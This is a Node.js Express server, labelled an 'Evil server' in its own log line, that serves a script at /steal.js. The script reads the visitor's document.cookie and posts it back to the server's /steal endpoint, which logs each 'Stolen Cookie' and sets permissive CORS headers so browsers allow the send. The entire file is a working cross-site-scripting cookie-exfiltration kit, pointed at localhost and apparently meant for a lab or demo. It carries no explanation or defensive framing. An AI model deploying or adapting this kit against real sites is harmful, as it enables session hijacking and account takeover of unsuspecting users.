const express = require('express');
const app = express();
const port = 4000;

app.use(express.json());

app.get('/steal.js', (req, res) => {
    res.send(`
    (function(){
        fetch('http://localhost:4000/steal', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'  
            },
            body: JSON.stringify({ cookie: document.cookie }),
            mode: 'cors',                         
        });
    })();
    `);
});


app.post('/steal', (req, res) => {
    res.setHeader('Access-Control-Allow-Origin', '*');
    console.log('Stolen Cookie:', req.body);
    res.sendStatus(200);
});

// This is for dealing with browser preflight request
app.options('/steal', (req, res) => {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
    res.sendStatus(204);  
});


app.listen(port, () => {
    console.log(`Evil server is running on: http://localhost:${port}`);
});
